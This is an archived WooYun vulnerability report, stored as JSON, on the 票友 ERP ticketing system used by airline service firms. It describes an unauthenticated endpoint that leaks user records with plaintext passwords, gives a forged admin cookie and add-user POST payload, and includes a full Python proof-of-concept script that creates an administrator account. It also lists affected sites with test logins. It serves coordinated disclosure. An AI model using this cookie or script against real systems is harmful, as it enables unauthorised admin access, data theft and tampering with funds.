{"id": 75603, "wybug_id": "wooyun-2016-0167023", "wybug_title": "票友ERP管理系统最新版设计权限，直接拿到管理员身份，众多航班服务公司躺枪(附验证脚本)", "wybug_corp": "票友ERP", "wybug_author": "sherwel", "wybug_date": "2016-01-04 13:46", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 这个系统有很多航空服务公司都在用所以请不要忽略，包括由于机场很多，我就不单独写，打包在一起，给个20吧 详细说明：  目前官方最新版为10.5.6http://**.**.**.**/经过测试在　/json_db/kefu_list.aspx?page=1&sidx=id&sord=asc　存在未授权访问获得的是　个人用户资料　但是密码是明文的，然后进一步测试　该ＥＲＰ在添加用户的时候，验证的时候，只验证cookie因此够造cookie就可以达到我们的目的在上面我们说过/json_db/kefu_list.aspx?page=1&sidx=id&sord=asc这个连接存在未授权访问，看看我们能获得什么消息\n\n根据图中的信息我们可以得到username,truename,kefugroup,roles等字段，这样我们就可以构造cookie了添加用户的连接为http://**.**.**.**/Ajax/users.ashx　　　　post请求里面的数据为fs=0&id=0&roles=22&username=testo&yusername=&pwd=testo&truename=testo&sex=男&age=1900-1-1&mob=&hk=&sfz=&zw=&kefugroup=总经办&week=&times=其中username,pwd,truename等都是要添加用户的属性，其中roles,kefugroup字段是与权限相关，不同网站是不一样的，从哪里获得呢？可以根据之前/json_db/kefu_list.aspx?page=1&sidx=id&sord=asc链接里面所获得的数据得到roles,kefugroup字段。得到这些字段后，我们构造一个管理员的cookie,根据/json_db/kefu_list.aspx?page=1&sidx=id&sord=asc里面的数据构造如下cookie:pyerpcookie=loginname=admin&truename=系统管理员&flag=1&datagroup=all&kefugroup=总经办&kpgroup=0&kpdian=kefugroup,truenamemloginname都是对应的填入构造好后就可以直接发送了\n#!/usr/bin/python#coding:utf-8import urllibimport urllib2import cookielibimport sys import timeimport datetimeimport gcimport sslimport chardetfrom Queue import Queueclass ConnectTool:\tdef  __init__(self,debuglevel=0):\t\tself.__null_proxy_handler= urllib2.ProxyHandler({})\t\turllib2.socket.setdefaulttimeout(10)                                    #设置超时时间\t\tself.__headers = { \t\t\t'User-Agent' :\t\t'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',\t\t\t'Referer':\t\t 'http://**.**.**.**',\t\t\t'Cookie':\t\t\t'pyerpcookie=loginname=admin&truename=系统管理员&flag=1&datagroup=all&kefugroup=总经办&kpgroup=0&kpdian='\t\t\t }\t\tself.__cookie=cookielib.CookieJar()\t\tself.__cJar=cookielib.LWPCookieJar()\t\tself.__httpcookieprocessor=urllib2.HTTPCookieProcessor(self.__cookie)\t\tself.__httpHandler= urllib2.HTTPHandler(debuglevel=debuglevel)\t\tself.__httpsHandler=urllib2.HTTPSHandler(debuglevel=debuglevel)\t\tself.__opener=''\t\tself.__opener=urllib2.build_opener(self.__httpcookieprocessor,self.__null_proxy_handler,self.__httpHandler,self.__httpsHandler)\t\turllib2.install_opener(self.__opener)\tdef  getHTML(self,URL,way='GET',params={},times=1):\t\tprint datetime.datetime.now()\t\tdata = 'fs=0&id=0&roles=22&username=testo&yusername=&pwd=testo&truename=testo&sex=男&age=1900-1-1&mob=&hk=&sfz=&zw=&kefugroup=总经办&week=&times='\t\turl=URL\t\tif way=='POST':\t\t\treq = urllib2.Request(url, data=data, headers=self.__headers)\t\telif len(params)==0:\t\t\treq= urllib2.Request(url,headers=self.__headers)\t\telse :\t\t\treq= urllib2.Request(url+'?'+data,headers=self.__headers)\t\tresponse=None\t\ttry:#\t\t\tgc.enable() #\t\t\tgc.set_debug(gc.DEBUG_LEAK)\t\t\tcontext = ssl._create_unverified_context()\t\t\tresponse = urllib2.urlopen(req,context=context)\t\t\ttemp=str(response.info())# \t\t\tprint 'cooke信息如下：'# \t\t\tfor item in self.__cookie:# \t\t\t\tprint 'Name = '+item.name# \t\t\t\tprint 'Value = '+item.value\t\t\tmsg=response.read()\t\t\t\t\t\tchardit1 = chardet.detect(msg)\t\t\tthe_page = str(msg)\t\t\t\t\t\t\t\t\ttry:\t\t\t\treturn temp.decode(chardit1['encoding']).encode('utf-8'),the_page.decode(chardit1['encoding']).encode('utf-8')\t\t\texcept Exception,e:\t\t\t\treturn temp,the_page\t\t\t#\t\tresponse = urllib2.urlopen('http://**.**.**.**',timeout=10)#\t\tprint 'head is %s' % response.info()\t\texcept Exception,e:\t\t\tmsgg=None\t\t\ttry:\t\t\t\tmsgg= '错误码为: %s' % str(e).encode('utf-8')\t\t\texcept Exception,e:\t\t\t\tmsgg= '错误码为: %s' % str(e)\t\t\tprint msgg\t\t\tif times <4:\t\t\t\tprint '尝试第'+str(times)+'次'\t\t\t\ttime.sleep(3)\t\t\t\treturn self.getHTML(URL, way, params, times+1)\t\t\telse :\t\t\t\tprint '失败次数过多，停止链接'\t\t\t\tthe_page= msgg\t\t\t\treturn '',the_page\t\tfinally:\t\t\t\tif response:\t\t\t\t\tresponse.close()# \t\t\t\t\tdel response\t\t#response.close()if __name__ == \"__main__\":\t\t\tp=ConnectTool()\tw,e=p.getHTML('http://**.**.**.**/Ajax/users.ashx',way='POST') \tprint w,e\n附上自己的脚本，返回１表示添加成功，返回０表示添加失败，返回２表示重复添加   漏洞证明：  \n\n由图中可以看到，拿到的是管理员权限，危害性很高，全部个人信息都可以获得，以及升舱之类的所有管理功能除此之外，还有更重要的，可以操纵资金。\n\n\n\n受波及的航空公司有很多\n\n案例http://**.**.**.**/Main.aspx　    test11 test11http://**.**.**.**/Main.aspx     testo  testohttp://**.**.**.**/Main.aspx    test11 test11http://**.**.**.**/Main.aspx test11 test11http://**.**.**.**/Main.aspx   test11 test11\n\n\n\n\n\n\n\n\n\n通用漏洞，危害大，求上首页。   修复方案：  你们比我更专业   版权声明：转载请注明来源 sherwel@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-08 18:00 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商（公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}